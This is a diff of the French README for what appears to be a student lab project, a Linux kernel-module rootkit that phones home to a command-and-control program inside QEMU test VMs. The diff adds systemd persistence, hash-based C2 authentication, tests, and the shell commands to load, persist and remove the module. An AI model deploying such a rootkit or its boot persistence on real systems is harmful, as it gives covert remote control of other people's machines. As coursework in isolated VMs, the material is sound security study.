@@ -13,18 +13,22 @@ Le rootkit est un module kernel Linux (LKM) qui s'installe sur une machine victi
 ├── AUTHORS
 ├── README.md
 ├── TODO
-├── DESIGN.md
+├── DESIGN.md                    # Choix d'architecture et justification des tests
 ├── epirootkit-subject.pdf
 ├── vm.sh                        # Script QEMU : crée et lance les deux VMs
+├── tests/                       # Tests automatisés locaux
+│   ├── README.md
+│   └── run_tests.py
 ├── vmshare/                     # Dossier partagé hôte ↔ VMs (VirtFS/9p)
 │   ├── rootkit/                 # Copie de travail compilée sur la victime
 │   └── attacking_program/       # Copie de travail compilée sur l'attaquant
 ├── rootkit/                     # Code source du module kernel (victim)
 │   ├── Makefile
+│   ├── install_persistence.sh    # Installe le module comme service systemd
 │   └── wlkom.c
-├── attacking_program/           # Code source du programme C2 (attaquant)
-│   ├── Makefile
-│   └── c2.c
+└── attacking_program/           # Code source du programme C2 (attaquant)
+    ├── Makefile
+    └── c2.c
 
 ```
 
@@ -194,7 +198,19 @@ cp -r rootkit/ vmshare/
 
 # Depuis la victime
 cd /mnt/vmshare/rootkit && make
-sudo insmod wlkom.ko c2_ip=192.168.100.10 c2_port=4444
+```
+
+Ensuite, soit charger le module en mode manuel sans persistance :
+
+```bash
+sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
+```
+
+soit installer la persistance, ce qui est le mode recommandé une fois la feature Persistence utilisée :
+
+```bash
+sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo systemctl restart wlkom.service
 ```
 
 Le montage est configuré automatiquement par cloud-init (`/etc/fstab` via directive `mounts`).
@@ -225,16 +241,42 @@ pas et la compilation échoue ou produit un module incompatible.
 
 ## Chargement du module
 
+Deux modes existent.
+
+Mode manuel sans persistance, utile pour tester rapidement le `.ko` courant :
+
 ```bash
 # Sur la VM victime
-sudo insmod wlkom.ko c2_ip=<IP_ATTAQUANT> c2_port=4444
+sudo insmod wlkom.ko password_hash=<HASH_FNV1A> c2_ip=<IP_ATTAQUANT> c2_port=4444
 sudo dmesg | tail    # vérifier "wlkom: loaded"
 
 # Déchargement
 sudo rmmod wlkom
 ```
 
+Mode persistant, recommandé après validation :
+
+```bash
+# Sur la VM victime
+sudo ./install_persistence.sh <HASH_FNV1A> <IP_ATTAQUANT> 4444
+sudo systemctl restart wlkom.service
+sudo systemctl --no-pager status wlkom.service
+```
+
+Dans ce mode, `password_hash`, `c2_ip` et `c2_port` sont stockés dans `/etc/modprobe.d/wlkom.conf`, puis appliqués automatiquement par `modprobe wlkom` au démarrage du service.
+
 ---
+
+## Tests
+
+Les tests automatisés locaux sont dans `tests/` :
+
+```bash
+python3 tests/run_tests.py
+```
+
+Ils vérifient les features déjà implémentées côté source : Makefile LKM pour `wlkom.ko`, logique de connexion reverse TCP avec retry, build du C2, obligation du mot de passe côté C2, calcul FNV-1a, envoi de la trame `AUTH <hash_fnv1a>` et validation de l'authentification côté module kernel. Le chargement réel de `wlkom.ko` reste à tester dans la VM victime, car il dépend du kernel en cours et de ses headers.
+
 
 ## Features
 
@@ -323,7 +365,7 @@ ssh -p 10023 epita@localhost   # mdp : epita
 cd /mnt/vmshare/attacking_program && make
 
 # Lancer le C2
-./c2 4444
+./c2 4444 test
 # → C2 listening on port 4444
 # → [HH:MM:SS] [?] Waiting for rootkit connection...
 ```
@@ -337,8 +379,9 @@ ssh -p 10022 epita@localhost   # mdp : epita
 # Compiler (une seule fois, doit se faire sur la victime)
 cd /mnt/vmshare/rootkit && make
 
-# Charger le module (les defaults c2_ip/c2_port correspondent à vm.sh)
-sudo insmod wlkom.ko password=<mdp>
+# Charger le module en mode manuel, sans persistance
+# Exemple pour le mot de passe test : password_hash=afd071e5
+sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
 ```
 
 **3. Vérifier la connexion**
@@ -350,7 +393,7 @@ Sur l'attaquant, le C2 affiche :
 
 Sur la victime, voir les logs kernel en temps réel :
 ```bash
-dmesg -w
+sudo dmesg -w
 # → wlkom: loaded
 # → wlkom: connected to C2 192.168.100.10:4444
 ```
@@ -363,7 +406,7 @@ wlkom: disconnected from C2, retrying
 wlkom: C2 unreachable (-111), retry in 5s
 ...
 ```
-Relancer `./c2 4444` — reconnexion automatique sans toucher à la victime.
+Relancer `./c2 4444 test` — reconnexion automatique sans toucher à la victime.
 
 **5. Décharger le module**
 
@@ -379,24 +422,107 @@ Sur l'attaquant :
 [HH:MM:SS] [?] Waiting for rootkit connection...
 ```
 
-### Persistence (1.5pt) — TODO
+### Persistence (1.5pt) — DONE
 
-### Password (1pt) — DONE (partiel)
+La persistance est assurée par un service systemd installé sur la VM victime. Le service charge `wlkom` via `modprobe` après `network-online.target`, ce qui laisse le temps à l'interface `vmnet` d'être configurée avant que le module tente de joindre le C2.
 
-Le mot de passe est passé au module via `module_param` au moment de l'`insmod` :
+Le script [rootkit/install_persistence.sh](rootkit/install_persistence.sh) automatise l'installation :
+
+1. copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/` ;
+2. exécute `depmod -a` ;
+3. écrit `/etc/modprobe.d/wlkom.conf` avec `password_hash`, `c2_ip` et `c2_port` ;
+4. crée `/etc/systemd/system/wlkom.service` ;
+5. active le service avec `systemctl enable`.
+
+Exemple avec le mot de passe `test` (`password_hash=afd071e5`) :
 
 ```bash
-sudo insmod wlkom.ko c2_ip=192.168.100.10 c2_port=4444 password="monmotdepasse"
+# Sur la VM victime
+cd /mnt/vmshare/rootkit
+make
+sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo systemctl start wlkom.service
+sudo systemctl status wlkom.service
 ```
 
-Le module refuse de se charger si le paramètre est absent ou vide (`-EINVAL`).
+Test après reboot :
+
+```bash
+# Sur l'attaquant
+cd /mnt/vmshare/attacking_program
+./c2 4444 test
+
+# Sur la victime
+sudo reboot
+# après reconnexion SSH
+lsmod | grep wlkom
+sudo systemctl status wlkom.service
+sudo dmesg | tail
+```
+
+Le log attendu côté victime contient `wlkom: loaded`, puis `wlkom: C2 authenticated` lorsque le C2 est disponible.
+
+Pour désactiver la persistance :
+
+```bash
+sudo systemctl disable --now wlkom.service
+sudo rm -f /etc/systemd/system/wlkom.service /etc/modprobe.d/wlkom.conf
+sudo rm -f /lib/modules/$(uname -r)/extra/wlkom.ko
+sudo depmod -a
+```
+
+
+### Password (1pt) — DONE
+
+Le module ne stocke pas le mot de passe brut. Il reçoit seulement un hash FNV-1a 32-bit via le paramètre kernel `password_hash`. Avec la persistance activée, ce paramètre est écrit dans `/etc/modprobe.d/wlkom.conf` par `install_persistence.sh`, puis relu automatiquement par `modprobe wlkom` quand `wlkom.service` démarre.
+
+Le module refuse de se charger si `password_hash` est absent ou vide (`-EINVAL`).
+
+**Pourquoi un hash ?**
+Le mot de passe brut n'est pas compilé dans `wlkom.ko` et n'est pas stocké comme paramètre module. Le module ne garde que le hash attendu. FNV-1a reste un hash simple non cryptographique, mais il suffit ici à ne pas transmettre/comparer directement le secret en clair.
 
 **Pourquoi `module_param` ?**
-C'est la façon idiomatique de passer de la configuration à un LKM sans hardcoder de valeur dans le binaire. Avec un mot de passe hardcodé, `strings wlkom.ko` l'exposerait immédiatement. Avec `module_param`, le `.ko` compilé ne contient aucun secret — le mot de passe est fourni à l'exécution par l'opérateur qui charge le module.
+C'est la façon idiomatique de passer de la configuration à un LKM sans hardcoder de valeur dans le binaire. Avec un mot de passe hardcodé, `strings wlkom.ko` l'exposerait immédiatement. Avec `module_param`, le `.ko` compilé ne contient aucun secret — le hash est fourni à l'exécution par l'opérateur qui charge le module ou par la configuration `modprobe`.
 
-**Permissions sysfs (`0400`)** : le paramètre est lisible après chargement par root uniquement via `/sys/module/wlkom/parameters/password`. Cela évite qu'un utilisateur non-privilégié puisse lire le mot de passe depuis l'espace utilisateur.
+**Permissions sysfs (`0400`)** : le paramètre est lisible après chargement par root uniquement via `/sys/module/wlkom/parameters/password_hash`. Cela évite qu'un utilisateur non-privilégié puisse lire le hash depuis l'espace utilisateur.
 
-**Ce qui reste à faire** : une fois Connection implémenté, le C2 devra envoyer `AUTH <password>` avant toute commande. Le rootkit comparera avec la valeur reçue à l'`insmod` et fermera la connexion si le mot de passe est incorrect.
+À la connexion, le C2 calcule le hash FNV-1a du mot de passe reçu sur sa ligne de commande et envoie `AUTH <hash_fnv1a>` avant toute commande. Le rootkit compare cette valeur avec le `password_hash` reçu au chargement et ferme la connexion si le hash est incorrect.
+
+Exemple avec le mot de passe `test`, dont le hash FNV-1a est `afd071e5`.
+
+Mode persistant, recommandé après installation de la persistence :
+
+```bash
+# Sur l'attaquant
+./c2 4444 test
+
+# Sur la victime
+cd /mnt/vmshare/rootkit
+sudo ./install_persistence.sh afd071e5 192.168.100.10 4444
+sudo systemctl restart wlkom.service
+sudo dmesg | tail
+```
+
+Pour tester un mauvais mot de passe en mode persistant, installer volontairement un hash différent puis redémarrer le service :
+
+```bash
+# Sur la victime
+cd /mnt/vmshare/rootkit
+sudo ./install_persistence.sh 00000000 192.168.100.10 4444
+sudo systemctl restart wlkom.service
+sudo dmesg | tail
+```
+
+Le C2 lancé avec `./c2 4444 test` enverra `AUTH afd071e5`, mais le module attendra `00000000`, donc les logs doivent contenir `wlkom: C2 authentication failed`.
+
+Mode manuel sans persistance, utile seulement pour un test rapide :
+
+```bash
+# Sur la victime
+sudo systemctl stop wlkom.service
+sudo rmmod wlkom
+sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
+```
 
 ### Executing commands (5pt) — TODO
 
@@ -413,5 +539,5 @@ C'est la façon idiomatique de passer de la configuration à un LKM sans hardcod
 1. Installer QEMU/KVM/libvirt sur la machine hôte Arch Linux (voir Prérequis)
 2. Lancer `./setup_vms.sh` — crée et configure les deux VMs
 3. Sur la VM attaquante : lancer le programme C2 (`attacking_program/`)
-4. Sur la VM victime : compiler le module (`make`) puis le charger (`insmod`)
+4. Sur la VM victime : compiler le module (`make`) puis le charger (`insmod`) ou installer la persistance (`install_persistence.sh`)
 5. Vérifier la connexion dans les logs du C2
